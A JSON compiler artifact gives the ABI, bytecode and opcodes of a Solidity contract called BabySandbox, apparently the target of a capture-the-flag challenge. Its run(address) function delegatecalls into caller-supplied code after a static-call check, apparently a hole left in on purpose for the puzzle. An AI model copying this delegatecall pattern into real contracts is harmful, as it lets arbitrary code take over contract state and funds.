{
  "contracts/babysandbox/BabySandbox.sol": {
    "BabySandbox": {
      "abi": [
        {
          "inputs": [
            {
              "internalType": "address",
              "name": "code",
              "type": "address"
            }
          ],
          "name": "run",
          "outputs": [],
          "stateMutability": "payable",
          "type": "function"
        }
      ],
      "evm": {
        "bytecode": {
          "linkReferences": {},
          "object": "608060405234801561001057600080fd5b5061012c806100206000396000f3fe608060405260043610601c5760003560e01c8063522bb704146021575b600080fd5b606060048036036020811015603557600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506062565b005b30331415609a57600080600080845af46000811460845760018114608e576098565b3d6000803e3d6000fd5b3d6000803e3d6000f35b505b61f0005a101560a857600080fd5b366000803760008036600030614000fa60c057600080fd5b6000803660008030614000f16000811460de576001811460e85760f2565b3d6000803e3d6000fd5b3d6000803e3d6000f35b505056fea26469706673582212208fdbfa6bf9f1f15affb8fe6a162950ff955101325b72cf5bdf47ed43fa92eb7464736f6c63430007000033",
          "opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x12C DUP1 PUSH2 0x20 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH1 0x1C JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x522BB704 EQ PUSH1 0x21 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x60 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH1 0x35 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH1 0x62 JUMP JUMPDEST STOP JUMPDEST ADDRESS CALLER EQ ISZERO PUSH1 0x9A JUMPI PUSH1 0x0 DUP1 PUSH1 0x0 DUP1 DUP5 GAS DELEGATECALL PUSH1 0x0 DUP2 EQ PUSH1 0x84 JUMPI PUSH1 0x1 DUP2 EQ PUSH1 0x8E JUMPI PUSH1 0x98 JUMP JUMPDEST RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 RETURN JUMPDEST POP JUMPDEST PUSH2 0xF000 GAS LT ISZERO PUSH1 0xA8 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST CALLDATASIZE PUSH1 0x0 DUP1 CALLDATACOPY PUSH1 0x0 DUP1 CALLDATASIZE PUSH1 0x0 ADDRESS PUSH2 0x4000 STATICCALL PUSH1 0xC0 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP1 CALLDATASIZE PUSH1 0x0 DUP1 ADDRESS PUSH2 0x4000 CALL PUSH1 0x0 DUP2 EQ PUSH1 0xDE JUMPI PUSH1 0x1 DUP2 EQ PUSH1 0xE8 JUMPI PUSH1 0xF2 JUMP JUMPDEST RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 RETURN JUMPDEST POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 DUP16 0xDB STATICCALL PUSH12 0xF9F1F15AFFB8FE6A162950FF SWAP6 MLOAD ADD ORIGIN JUMPDEST PUSH19 0xCF5BDF47ED43FA92EB7464736F6C6343000700 STOP CALLER "
        },
        "methodIdentifiers": {
          "run(address)": "522bb704"
        }
      }
    }
  }
}